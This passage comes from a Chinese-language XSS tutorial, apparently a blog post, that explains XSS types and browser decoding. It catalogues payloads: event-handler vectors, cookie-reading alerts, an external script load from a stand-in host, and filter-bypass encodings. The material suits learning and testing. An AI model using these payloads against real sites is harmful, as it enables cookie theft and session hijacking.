href=\"https://saucer-man.com/information_security/103.html\">探索XSS利用编码绕过的原理</a></p>\n","site":{"data":{}},"wordcount":6848,"more":"<ul>\n<li><a href=\"#1-xss-%E6%A6%82%E8%BF%B0%E5%92%8C%E5%8E%9F%E7%90%86\">1 XSS 概述和原理</a></li>\n<li><a href=\"#11-xss-%E7%B1%BB%E5%9E%8B\">1.1 XSS 类型</a></li>\n<li><a href=\"#2-xss-%E8%BD%BD%E8%8D%B7%E4%B8%8E%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE\">2 XSS 载荷与插入位置</a><ul>\n<li><a href=\"#21-%E8%BD%BD%E8%8D%B7\">2.1 载荷</a><ul>\n<li><a href=\"#211-script-%E6%A0%87%E7%AD%BE\">2.1.1 script 标签</a></li>\n<li><a href=\"#212-svg-%E6%A0%87%E7%AD%BE\">2.1.2 svg 标签</a></li>\n<li><a href=\"#213-img-%E6%A0%87%E7%AD%BE\">2.1.3 img 标签</a></li>\n<li><a href=\"#214-body-%E6%A0%87%E7%AD%BE\">2.1.4 body 标签</a></li>\n<li><a href=\"#215-video-%E6%A0%87%E7%AD%BE\">2.1.5 video 标签</a></li>\n<li><a href=\"#216-style-%E6%A0%87%E7%AD%BE\">2.1.6 style 标签</a></li>\n<li><a href=\"#217-details\">2.1.7 details</a></li>\n<li><a href=\"#218-select\">2.1.8 select</a></li>\n<li><a href=\"#219-iframe\">2.1.9 iframe</a></li>\n<li><a href=\"#2110-form\">2.1.10 form</a></li>\n<li><a href=\"#2111-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE\">2.1.11 自定义标签</a></li>\n</ul>\n</li>\n<li><a href=\"#22-xss-%E5%8F%AF%E4%BB%A5%E6%8F%92%E5%85%A5%E7%9A%84%E4%BD%8D%E7%BD%AE\">2.2 XSS 可以插入的位置</a><ul>\n<li><a href=\"#221-%E6%B5%8B%E8%AF%95%E4%BD%8D%E7%BD%AE\">2.2.1 测试位置</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#3-xss-%E7%BC%96%E7%A0%81%E4%B8%8E%E7%BB%95%E8%BF%87\">3 XSS 编码与绕过</a><ul>\n<li><a href=\"#31-%E7%BD%91%E9%A1%B5%E7%9A%84%E8%A7%A3%E7%A0%81%E8%BF%87%E7%A8%8B\">3.1 网页的解码过程</a></li>\n<li><a href=\"#32-%E7%BB%95%E8%BF%87\">3.2 绕过</a><ul>\n<li><a href=\"#321-%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4\">3.2.1 关键字被过滤</a><ul>\n<li><a href=\"#3211-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87\">3.2.1.1 双写绕过</a></li>\n<li><a href=\"#3212-%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5\">3.2.1.2 字符拼接</a></li>\n<li><a href=\"#3213-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\">3.2.1.3 编码绕过</a></li>\n<li><a href=\"#3214-%E5%86%85%E5%B5%8C%E7%BC%96%E7%A0%81%E5%90%8Etab\">3.2.1.4 内嵌编码后TAB</a></li>\n<li><a href=\"#3215-%E5%A4%9A%E9%87%8D%E5%B0%96%E6%8B%AC%E5%8F%B7\">3.2.1.5 多重尖括号</a></li>\n<li><a href=\"#3216-%E5%B0%86js%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BA%E5%9B%BE%E5%83%8F\">3.2.1.6 将JS文件重命名为图像</a></li>\n</ul>\n</li>\n<li><a href=\"#322-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%BC%95%E5%8F%B7\">3.2.2 过滤空格&#x2F;引号</a><ul>\n<li><a href=\"#3221-%E4%BD%BF%E7%94%A8%E4%BB%A3%E6%9B%BF\">3.2.2.1 使用&#x2F;代替</a></li>\n</ul>\n</li>\n<li><a href=\"#323-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7\">3.2.3 过滤单&#x2F;双引号</a></li>\n<li><a href=\"#324-%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7\">3.2.4 过滤括号</a></li>\n<li><a href=\"#325-%E8%BF%87%E6%BB%A4url%E5%9C%B0%E5%9D%80\">3.2.5 过滤URL地址</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#4-%E5%88%A9%E7%94%A8\">4 利用</a><ul>\n<li><a href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\">参考文章</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-XSS-概述和原理\"><a href=\"#1-XSS-概述和原理\" class=\"headerlink\" title=\"1 XSS 概述和原理\"></a>1 XSS 概述和原理</h1><p>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份&#x2F;钓鱼&#x2F;传播恶意代码等行为。  </p>\n<p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 &lt; 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>\n<h1 id=\"1-1-XSS-类型\"><a href=\"#1-1-XSS-类型\" class=\"headerlink\" title=\"1.1 XSS 类型\"></a>1.1 XSS 类型</h1><ul>\n<li>存储型XSS</li>\n</ul>\n<p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 cookie</p>\n<p><img src=\"/img/article/XSS/%E5%AD%98%E5%82%A8%E5%9E%8Bxss.png\" alt=\"存储型xss\"></p>\n<ul>\n<li>反射型XSS</li>\n</ul>\n<p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>\n<p><img src=\"/img/article/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss.png\" alt=\"反射型xss\"></p>\n<ul>\n<li>DOM型XSS</li>\n</ul>\n<p>不经过后端，DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，DOM—XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。DOM的详解：DOM文档对象模型  </p>\n<blockquote>\n<p>可能触发DOM型XSS的属性：document.referer window.name location innerHTML documen.write </p>\n</blockquote>\n<h1 id=\"2-XSS-载荷与插入位置\"><a href=\"#2-XSS-载荷与插入位置\" class=\"headerlink\" title=\"2 XSS 载荷与插入位置\"></a>2 XSS 载荷与插入位置</h1><h2 id=\"2-1-载荷\"><a href=\"#2-1-载荷\" class=\"headerlink\" title=\"2.1 载荷\"></a>2.1 载荷</h2><blockquote>\n<p>tip: 所有的闭合标签的 <code>&gt;</code> 都可以用 <code>//</code> 代替 </p>\n</blockquote>\n<h3 id=\"2-1-1-script-标签\"><a href=\"#2-1-1-script-标签\" class=\"headerlink\" title=\"2.1.1 script 标签\"></a>2.1.1 script 标签</h3><ul>\n<li>script 标签是最直接的XSS有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-string\">&quot;hack&quot;</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>  <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-regexp\">/hack/</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>  <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span> ＃ 弹出1，对于数字可以不用引号 <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span> ＃ 弹出cookie <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>＝<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">xxx.com</span>/<span class=\"hljs-attr\">xss.js</span> &gt;</span> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span> ＃ 引用外部的js <br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-2-svg-标签\"><a href=\"#2-1-2-svg-标签\" class=\"headerlink\" title=\"2.1.2 svg 标签\"></a>2.1.2 svg 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">svg</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">&quot;alert(1)&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">svg</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">&quot;alert(1)&quot;</span>//</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-3-img-标签\"><a href=\"#2-1-3-img-标签\" class=\"headerlink\" title=\"2.1.3 img 标签\"></a>2.1.3 img 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">1</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>&quot;<span class=\"hljs-attr\">hack</span>&quot;)&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">1</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(document.cookie)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n<h3 id=\"2-1-4-body-标签\"><a href=\"#2-1-4-body-标签\" class=\"headerlink\" title=\"2.1.4 body 标签\"></a>2.1.4 body 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span> <span class=\"hljs-attr\">onpageshow</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-5-video-标签\"><a href=\"#2-1-5-video-标签\" class=\"headerlink\" title=\"2.1.5 video 标签\"></a>2.1.5 video 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">video</span> <span class=\"hljs-attr\">onloadstart</span>=<span class=\"hljs-string\">alert(1)</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;/media/aaa.mp4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-6-style-标签\"><a href=\"#2-1-6-style-标签\" class=\"headerlink\" title=\"2.1.6 style 标签\"></a>2.1.6 style 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-7-details\"><a href=\"#2-1-7-details\" class=\"headerlink\" title=\"2.1.7 details\"></a>2.1.7 details</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">details</span> <span class=\"hljs-attr\">open</span> <span class=\"hljs-attr\">ontoggle</span>=<span class=\"hljs-string\">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-8-select\"><a href=\"#2-1-8-select\" class=\"headerlink\" title=\"2.1.8 select\"></a>2.1.8 select</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1)</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-9-iframe\"><a href=\"#2-1-9-iframe\" class=\"headerlink\" title=\"2.1.9 iframe\"></a>2.1.9 iframe</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(</span>&quot;<span class=\"hljs-attr\">xss</span>&quot;);&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">javascript:alert(</span>&#x27;<span class=\"hljs-attr\">xss</span>&#x27;)&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-10-form\"><a href=\"#2-1-10-form\" class=\"headerlink\" title=\"2.1.10 form\"></a>2.1.10 form</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">form</span> <span class=\"hljs-attr\">action</span>=<span class=\"hljs-string\">javascript:alert(</span>&#x27;<span class=\"hljs-attr\">xss</span>&#x27;) <span class=\"hljs-attr\">method</span>=<span class=\"hljs-string\">&quot;get&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-11-自定义标签\"><a href=\"#2-1-11-自定义标签\" class=\"headerlink\" title=\"2.1.11 自定义标签\"></a>2.1.11 自定义标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&#x27;javascript:alert(666)&#x27;</span>&gt;</span>click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&#x27;javascript:alert(document.domain)&#x27;</span>&gt;</span>click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-XSS-可以插入的位置\"><a href=\"#2-2-XSS-可以插入的位置\" class=\"headerlink\" title=\"2.2 XSS 可以插入的位置\"></a>2.2 XSS 可以插入的位置</h2><ul>\n<li>用户输入作为script的标签内容</li>\n<li>用户输入作为html注释内容</li>\n<li>用户输入作为html标签的属性名</li>\n<li>用户输入作为html标签属性值</li>\n<li>用户输入作为html标签的名字直接插入到CSS里</li>\n</ul>\n<h3 id=\"2-2-1-测试位置\"><a href=\"#2-2-1-测试位置\" class=\"headerlink\" title=\"2.2.1 测试位置\"></a>2.2.1 测试位置</h3><ul>\n<li>常见业务场景<br>重灾区：评论区、留言区、个人信息、订单信息、站内信、网页及时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性、URL本身、URL所有参数、表单</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">uername=<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\">alert(1)<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>&amp;</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>&amp;password=******<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-XSS-编码与绕过\"><a href=\"#3-XSS-编码与绕过\" class=\"headerlink\" title=\"3 XSS 编码与绕过\"></a>3 XSS 编码与绕过</h1><h2 id=\"3-1-网页的解码过程\"><a href=\"#3-1-网页的解码过程\" class=\"headerlink\" title=\"3.1 网页的解码过程\"></a>3.1 网页的解码过程</h2><p>编码就是将字符变为二进制数，而解码就是还原二进制数为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程。</p>\n<ul>\n<li>URL编码</li>\n</ul>\n<p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>\n<ul>\n<li>HTML编码&#x2F;解码</li>\n</ul>\n<p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是看到的源代码。具体的解码方式依具体情况而定，所以需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码，所以很多网页就指定了解码方式为UTF-8。</p>\n<p>但是在HTML中有些字符是和关键词冲突的，比如&lt;、&gt;、&amp;，解码之后，浏览器会误认为它们是标签，为了正确地显示预留字符，需要在HTML源代码中使用字符实体，比如常见的空格&amp;nbsp;，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>\n<table>\n<thead>\n<tr>\n<th>显示结果</th>\n<th>描述</th>\n<th>实体名称</th>\n<th>实体编号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt;</td>\n<td>小于号</td>\n<td>&lt;</td>\n<td>&amp;#60;</td>\n</tr>\n<tr>\n<td>&gt;</td>\n<td>大于号</td>\n<td>&gt;</td>\n<td>&amp;#62;</td>\n</tr>\n</tbody></table>\n<p>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p>\n<blockquote>\n<p>tip:所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p>\n</blockquote>\n<ul>\n<li>JS解码（只支持UNICODE）</li>\n</ul>\n<p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而src、 href 后边加入的javascript 伪URL，也会进入JS 的解析模式。</p>\n<p>比如<code>&lt;a href=&quot;javascript:alert(&#39;&lt;\\u4e00&gt;&#39;)&quot;&gt;test&lt;/a&gt;</code>，javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\\u4e00，前导的 \\u 表示他是一个unicode 字符，根据后边的数字，解析为一，于是在完成JS的解析之后变成了：href&#x3D;”javascript:alert(‘&lt;一&gt;’)”&gt;test</p>\n<h2 id=\"3-2-绕过\"><a href=\"#3-2-绕过\" class=\"headerlink\" title=\"3.2 绕过\"></a>3.2 绕过</h2><h3 id=\"3-2-1-关键字被过滤\"><a href=\"#3-2-1-关键字被过滤\" class=\"headerlink\" title=\"3.2.1 关键字被过滤\"></a>3.2.1 关键字被过滤</h3><h4 id=\"3-2-1-1-双写绕过\"><a href=\"#3-2-1-1-双写绕过\" class=\"headerlink\" title=\"3.2.1.1 双写绕过\"></a>3.2.1.1 双写绕过</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">scrscriptipt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">scrscriptipt</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-2-字符拼接\"><a href=\"#3-2-1-2-字符拼接\" class=\"headerlink\" title=\"3.2.1.2 字符拼接\"></a>3.2.1.2 字符拼接</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">top[<span class=\"hljs-string\">&quot;al&quot;</span>+<span class=\"hljs-string\">&quot;ert&quot;</span>](<span class=\"hljs-string\">`xss`</span>);</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-3-编码绕过\"><a href=\"#3-2-1-3-编码绕过\" class=\"headerlink\" title=\"3.2.1.3 编码绕过\"></a>3.2.1.3 编码绕过</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># Unicode 编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;<span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#108;</span><span class=\"hljs-symbol\">&amp;#101;</span><span class=\"hljs-symbol\">&amp;#114;</span><span class=\"hljs-symbol\">&amp;#116;</span><span class=\"hljs-symbol\">&amp;#40;</span><span class=\"hljs-symbol\">&amp;#34;</span><span class=\"hljs-symbol\">&amp;#120;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#34;</span><span class=\"hljs-symbol\">&amp;#41;</span><span class=\"hljs-symbol\">&amp;#59;</span>&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(&#x27;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b&#x27;)&quot;</span>&gt;</span><br><br># url 编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br><br># ascii 码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br><br># hex 码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">eval(</span>&#x27;\\<span class=\"hljs-attr\">x61</span>\\<span class=\"hljs-attr\">x6c</span>\\<span class=\"hljs-attr\">x65</span>\\<span class=\"hljs-attr\">x72</span>\\<span class=\"hljs-attr\">x74</span>\\<span class=\"hljs-attr\">x28</span>\\<span class=\"hljs-attr\">x27</span>\\<span class=\"hljs-attr\">x78</span>\\<span class=\"hljs-attr\">x73</span>\\<span class=\"hljs-attr\">x73</span>\\<span class=\"hljs-attr\">x27</span>\\<span class=\"hljs-attr\">x29</span>&#x27;)&gt;</span><br><br># 八进制<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>&#x27;\\<span class=\"hljs-attr\">170</span>\\<span class=\"hljs-attr\">163</span>\\<span class=\"hljs-attr\">163</span>&#x27;)&gt;</span><br><br># base64<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-4-内嵌编码后TAB\"><a href=\"#3-2-1-4-内嵌编码后TAB\" class=\"headerlink\" title=\"3.2.1.4 内嵌编码后TAB\"></a>3.2.1.4 内嵌编码后TAB</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;jav<span class=\"hljs-symbol\">&amp;#x09;</span>ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-5-多重尖括号\"><a href=\"#3-2-1-5-多重尖括号\" class=\"headerlink\" title=\"3.2.1.5 多重尖括号\"></a>3.2.1.5 多重尖括号</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">&lt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-string\">&quot;XSS&quot;</span>);<span class=\"hljs-comment\">//&lt;</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 